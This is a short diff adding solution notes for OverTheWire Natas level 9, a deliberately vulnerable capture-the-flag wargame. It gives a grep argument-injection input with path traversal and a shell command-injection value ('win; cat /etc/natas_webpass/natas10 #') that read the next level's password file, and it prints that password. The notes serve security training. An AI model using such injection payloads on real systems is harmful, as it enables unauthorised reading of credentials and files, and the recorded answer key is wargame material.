@@ -1,0 +1,10 @@
+Enter the following:
+-r '' ../../../../../etc/natas_webpass/natas10 --exclude 
+
+so the grep will find the password for us:
+=> nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+or here:
+http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-9.html
+
+it uses win; cat /etc/natas_webpass/natas10 #
